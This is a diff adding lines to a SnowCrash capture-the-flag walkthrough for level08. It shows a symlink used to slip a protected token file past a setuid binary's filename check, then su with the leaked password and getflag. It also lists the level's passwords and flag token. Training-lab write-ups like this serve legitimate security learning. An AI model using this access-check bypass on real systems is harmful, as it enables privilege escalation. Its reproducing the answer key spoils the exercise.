@@ -4,3 +4,7 @@ level08@192.168.1.64's password: fiumuikeil55xe9cu4dood66h
 level08@SnowCrash:~$ ln -s $(realpath token) /tmp/symlink
 level08@SnowCrash:~$ ./level08 /tmp/symlink
 quif5eloekouj29ke0vouxean
+level08@SnowCrash:~$ su flag08
+Password: quif5eloekouj29ke0vouxean
+flag08@SnowCrash:~$ getflag
+Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
